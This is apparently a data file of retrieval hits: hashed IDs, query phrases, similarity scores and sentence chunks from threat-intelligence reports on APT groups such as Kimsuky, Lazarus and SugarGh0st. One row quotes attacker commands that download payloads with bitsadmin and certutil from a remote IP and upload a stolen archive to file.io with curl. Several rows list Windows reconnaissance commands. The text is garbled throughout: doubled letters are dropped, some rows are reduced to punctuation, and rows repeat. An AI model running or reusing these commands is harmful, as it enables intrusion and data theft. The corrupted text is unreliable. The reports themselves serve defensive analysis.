bd097ffaaa48344fda3e6704d76f4f4b,The BAT script,0.782368730052912,"['Static information of DL are shown below: Hash ca24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d329ade52ec8382c2 Threat Kimsuky second stage Brief DL used by the Kimsuky group as second stage Description Ssdep 614:6lhe64TNUalJMRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uL Table 2: AutoUpdate.dl Information The dl is then copied into the folder %ApData%\\Roaming\\Microsoft\\Windows\\Defender\\ and it is renamed into AutoUpdate.dl.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 2/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog The AutoUpdate.dl library then gains persistence by seting the folowing registry key HKCU\\Software\\Microsoft\\Windows\\CurentVersion\\RunOnce\\WindowsDefender.', 'The name and the path used by the atacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %ApData%\\Local\\Temp path, we observed another temporary file created and imediately removed dubed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is posible to obtain the CV Form string.', 'The name and other information about the document are the folowing: Hash d21523b7b8f6584305a0a6a83cd65c8ce07a42ab781c35a06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert atention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahU:r3YkA+1aJuk dep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the folowing figure.', 'htps:/blog.yoroi.company/research/the-north-korean-kimsuky-apt-keps-threatening-south-korea-evolving-its-tps/ 3/12 3/4/2020 The North Korean Kimsuky APT keps threatening South Korea evolving its TPs Yoroi Blog Figure 6: Legit document overview Bypasing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dl in order to avoid AVs detection.', 'Diging in the malicious code, it is posible to se the methods used to perform this operation.']"
3d2e99ba94188b71a17364073a49e3ea,using a batch file named find.bat.,0.7548133282462509,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
39e29af445d8deae622f11c7366518a7,using a batch script,0.751362762646234,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,using a batch script,0.751362762646234,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
39e29af445d8deae622f11c7366518a7,batch script,0.8294291630619777,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,batch script,0.8294291630619777,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
73ae3d11837c3f9dbcfc8f41544bb20e,ipconfig,0.80966835917559,"[' .', '2017.', '2 0 1 7.', '- (Ii -) .46535.I5 3 474 2 0 1 7.', '2017 1 3 1.1 .3 1.2 .3 1.3 .3 1.4 .5 1.5 , , , , .25 1.6 - .30 1.7 .31 1.8 .31 1.9 .31 32 314 320 2 1 1.1 1.1.1 ( ) () - RU.0176-01 ( ), , - () .', '1.2 1.2.1 - () - 1 , - .']"
920bbf3f4cf30cf9c556531074485448,cmd.exe /C,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe /C,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe /C,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe /C,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe /C,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurentVersion\\Internet Setings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tols, atribution 1 Key 2 Atack 3 Atack 4 Recomendations 5 Indicators of 6 Apendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module wil use the ""kilkil"" comand to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Droper using the htp comand.', 'Droper wil then instal Client_RAT to the infected system as folows: RECON DROPER LOADER CLIENT_RAT 1 2 3 DROPER Recon decrypts LOADER Droper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Droper extracts decrypted Client_RAT Client_RAT Droper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Droper neds MD5 encryption key, which only the atacker knows.', 'Group-IB specialists have analyzed two versions of Droper.', 'There are no fundamental diferences betwen them: both versions were used to decrypt the loader and encrypted payload, as wel as to ensure loader persistence in the system.']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.8135172745614935,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,cmd.exe /C,0.7962584600454754,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
af9a848f4c926a7dce431e4a9399b939,cmd.exe /C,0.7597704693771454,"['NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tol at its disposal, caled Symbexcel, that aplies symbolic execution techniques to the analysis of Excel macros.16 Using this tol, we can automaticaly de-obfuscate the XL4 macros and identify the aditional components being downloaded (se Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threfold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The atackers may chose to use multiple hosts to increase the chances to download the payload and improve suces rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by runing rundl32.exe.', '3.', 'Gain registry persistence by runing DlRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC comand line is shown Figure 6).', 'The payload is a DL file, which (unsurprisingly) is the main Emotet DL.', 'In the case of the Excel document with hash 7c0d0a80e7eb3af7ce549df78a5a68cbd5deb5, the DL is 8cf39a587aeb8f075a0ae23a42e16ce3656e71.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /C,1.0,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
75cc8a0644773730b057da3924e5cc0e,default or weak credentials,0.7625443895104775,"['o Network trafic from the internet to closed group SATCOM networks.', 'o Brute force login atempts over SATCOM network segments.', 'Se the Ofice of the Director of National Inteligence (ODNI) Anual Threat Asesment of the U.S. Inteligence Comunity, February 202 for specific state-sponsored cyber threat activity relating to SATCOM networks.', 'Mitigations for SATCOM Network Providers and Customers Use secure methods for authentication, including multifactor authentication where posible, for al acounts used to aces, manage, and/or administer SATCOM networks.', 'o Use and enforce strong, complex paswords: Review pasword policies to ensure they align with the latest NIST guidelines.', 'o Do not use default credentials or weak paswords.', 'o Audit acounts and credentials: remove terminated or unecesary acounts; change expired credentials.', 'Enforce principle of least privilege through authorization policies.', 'Minimize unecesary privileges for identities.', 'Consider privileges asigned to individual personel acounts, as wel as those asigned to non-personel acounts (e.g., those asigned to software or systems).', 'Acount privileges should be clearly defined, narowly scoped, and regularly audited against usage paterns.']"
8eb1f16e59328363d2929e47b8c6c819,malicious payload,0.7524081431564816,"['2 Disclaimer .', '2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.']"
8eb1f16e59328363d2929e47b8c6c819,malicious payload,0.7524081431564816,"['2 Disclaimer .', '2 Introduction .', '4 Sumary of changes .', '4 Neuron Updates .', '5 Loader .', '5 Payload .', '6 Encryption .', '6 Comunications .', '6 Asociated Files .', '6 Neuron Yara .', '7 TLP WHITE Page 3 of 8 TLP WHITE Introduction In November 2017, the NCSC released an advisory highlighting the Turla Groups use of the tols Neuron and Nautilus.1 Since then, the NCSC has identified a new version of the Neuron malware.']"
1c2dc632ec1db866a6e15456e1a36207,malicious payload,0.7524081431564816,"['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOLSET AND STRATEGIC COPERATIONS Authors: Zuzana Hromcov Anton Cherepanov TLP: WHITE 2 InvisiMole: The hiden part of the story CONTENTS 1 EXECUTIVE SUMARY 4 2 ATACKS AND INVESTIGATION 4 2.1 InvisiMoles tolset .', '.', '.', '.', '.', '.', '.']"
1c2dc632ec1db866a6e15456e1a36207,malicious payload,0.7524081431564816,"['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOLSET AND STRATEGIC COPERATIONS Authors: Zuzana Hromcov Anton Cherepanov TLP: WHITE 2 InvisiMole: The hiden part of the story CONTENTS 1 EXECUTIVE SUMARY 4 2 ATACKS AND INVESTIGATION 4 2.1 InvisiMoles tolset .', '.', '.', '.', '.', '.', '.']"
886e8ac1a36dedd8a2076088d6b08db7,downloads,0.8325351908472014,"['Standalone EXE.', 'Presumed to be an earlier version before 2014 2015.04 CRYPTBASE.dl Asumed to have ben created in December 2014.', 'Independent DL.', 'Colect system information and file information within the USB flash drive.', '2015.06 BrWeb.dl, wsmt.exe Loads BrWeb.dl by patching a Brother Printer-related file.', 'Downloads files.', 'ALYAC25.exe patch function.', 'Scans *.hwp files.', 'Infects EXE files.', 'Aditional malware is found.', '2015.06 CRYPTBASE.dl, svcmgr.exe Bnb Solution comparison functions were aded.']"
886e8ac1a36dedd8a2076088d6b08db7,downloads,0.8325351908472014,"['Standalone EXE.', 'Presumed to be an earlier version before 2014 2015.04 CRYPTBASE.dl Asumed to have ben created in December 2014.', 'Independent DL.', 'Colect system information and file information within the USB flash drive.', '2015.06 BrWeb.dl, wsmt.exe Loads BrWeb.dl by patching a Brother Printer-related file.', 'Downloads files.', 'ALYAC25.exe patch function.', 'Scans *.hwp files.', 'Infects EXE files.', 'Aditional malware is found.', '2015.06 CRYPTBASE.dl, svcmgr.exe Bnb Solution comparison functions were aded.']"
6c9da1182b14cab92b846b684d492547,process enumerations.,0.7893208244717719,"['acros For example, if there are five botnet to smal to analyze.', '34 fields OR be a DoS atack.', 'breaches, the sample size is five.', 'Exceptions are given to confirmed However, since each botnet used 2.', 'W e wont talk about count or data breaches with les than seven phishing, instaled keylogers and used percentage for smal samples.', 'enumerations.', 'stolen credentials, there would be five This goes for figures to and is The incident must have at least one Social actions, five Hacking actions and why some figures lack the dot for known VERIS threat action category five Malware actions, ading up to 30%.', 'the median frequency.', '(Hacking, Malware, etc.).', 'This is normal, expected and handled 3.', 'For smal samples, we may talk about corectly in our analysis and toling.']"
fd1e2466e0c27de5905c2d67061cd76f,file download/upload,0.793860001801613,"['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 202.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0C95976081C7A85C7926C03172A3DA67269042C) apears to be a curiculum 4/17 vitae (similar to a resume) of an individual named Roshan.']"
564c219dc0a2c3edd2eed08025387d9d,file download/upload,0.811666429623082,"['comand codes in the MargualsRAT indicating that this RAT is actively in development by the atackers.', 'ALAKORE Alakore is a publicly available Delphi- based RAT that has consistently ben used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Alakore include: Keyloging.', 'Capture screnshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change walpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Comand handler of MargulasRAT.', 'containing a limited set of capabilities.']"
3d2e99ba94188b71a17364073a49e3ea,a batch file,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
3f3a0785d95b56f0cddca039498bc254,the adversary identifies data of interest from the network of the victim,0.9010072245360844,"['If the obtained valid acount is already member of the domain admins group, the first lateral move in the network is usualy to a domain controler where the adversary also deploys a Cobalt Strike beacon.', 'Otherwise, a jump host or other system likely used by domain admins is found and equiped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent aces into the victims network.', 'If the victims network contains other Windows domains or diferent network security zones, the adversary scans and finds the trust relationships and jump hosts, atempting to move into the other domains and security zones.', 'The adversary is typicaly able to perform al the steps described above within one day.', 'During this proces, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intelectual property (IP), and personaly identifiable information (PI) scraped from memory.', 'If the data is smal enough, it is exfiltrated through the comand and control chanel of the Cobalt Strike beacons.', 'However, usualy the data is compresed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-acount controled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weks to check for new data of interest and user acounts.', 'At times they have ben observed atempting to perform a degre of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.']"
3f3a0785d95b56f0cddca039498bc254,"This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",0.8319968205690123,"['Otherwise, a jump host or other system likely used by domain admins is found and equiped with a Cobalt Strike beacon.', 'After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent aces into the victims network.', 'If the victims network contains other Windows domains or diferent network security zones, the adversary scans and finds the trust relationships and jump hosts, atempting to move into the other domains and security zones.', 'The adversary is typicaly able to perform al the steps described above within one day.', 'During this proces, the adversary identifies data of interest from the network of the victim.', 'This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intelectual property (IP), and personaly identifiable information (PI) scraped from memory.', 'If the data is smal enough, it is exfiltrated through the comand and control chanel of the Cobalt Strike beacons.', 'However, usualy the data is compresed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-acount controled by the adversary.', 'After the adversary completes their initial exfiltration, they return every few weks to check for new data of interest and user acounts.', 'At times they have ben observed atempting to perform a degre of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.', 'But this isnt done consistently acros their engagements.']"
